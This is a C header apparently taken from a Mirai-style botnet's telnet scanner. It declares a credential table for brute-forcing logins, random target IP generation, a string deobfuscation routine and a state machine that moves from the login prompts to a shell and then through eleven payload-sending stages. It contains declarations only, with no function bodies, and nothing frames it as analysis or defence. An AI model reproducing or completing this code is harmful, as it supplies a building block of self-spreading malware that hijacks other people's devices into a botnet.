#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
#define SCANNER_MAX_CONNS   256
#define SCANNER_RAW_PPS     3840
#else
#define SCANNER_MAX_CONNS   256
#define SCANNER_RAW_PPS     788
#endif

#define SCANNER_RDBUF_SIZE  1080
#define SCANNER_HACK_DRAIN  64

struct scanner_auth {
    char *username;
    char *password;
    uint16_t weight_min, weight_max;
    uint8_t username_len, password_len;
};

struct scanner_connection {
    struct scanner_auth *auth;
    int fd, last_recv;
    enum {
        SC_CLOSED,
        SC_CONNECTING,
        SC_HANDLE_IACS,
        SC_WAITING_USERNAME,
        SC_WAITING_PASSWORD,
        SC_WAITING_PASSWD_RESP,
        SC_WAITING_ENABLE_RESP,
        SC_WAITING_SYSTEM_RESP,
        SC_WAITING_SHELL_RESP,
        SC_WAITING_SH_RESP,
        SC_WAITING_TOKEN_RESP,
        SC_PREP_DEVICE,
        SC_SENDPAYLOAD_1,
        SC_SENDPAYLOAD_2,
        SC_SENDPAYLOAD_3,
        SC_SENDPAYLOAD_4,
        SC_SENDPAYLOAD_5,
        SC_SENDPAYLOAD_6,
        SC_SENDPAYLOAD_7,
        SC_SENDPAYLOAD_8,
        SC_SENDPAYLOAD_9,
        SC_SENDPAYLOAD_10,
        SC_SENDPAYLOAD_11
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[SCANNER_RDBUF_SIZE];
    uint8_t tries;
};

void scanner_init();
void scanner_kill(void);

static void setup_connection(struct scanner_connection *);
static ipv4_t get_random_ip(void);

static int consume_iacs(struct scanner_connection *);
static int consume_any_prompt(struct scanner_connection *);
static int consume_user_prompt(struct scanner_connection *);
static int consume_pass_prompt(struct scanner_connection *);
static int consume_resp_prompt(struct scanner_connection *);

static void add_auth_entry(char *, char *, uint16_t);
static struct scanner_auth *random_auth_entry(void);
static char *deobf(char *, int *);
static BOOL can_consume(struct scanner_connection *, uint8_t *, int);

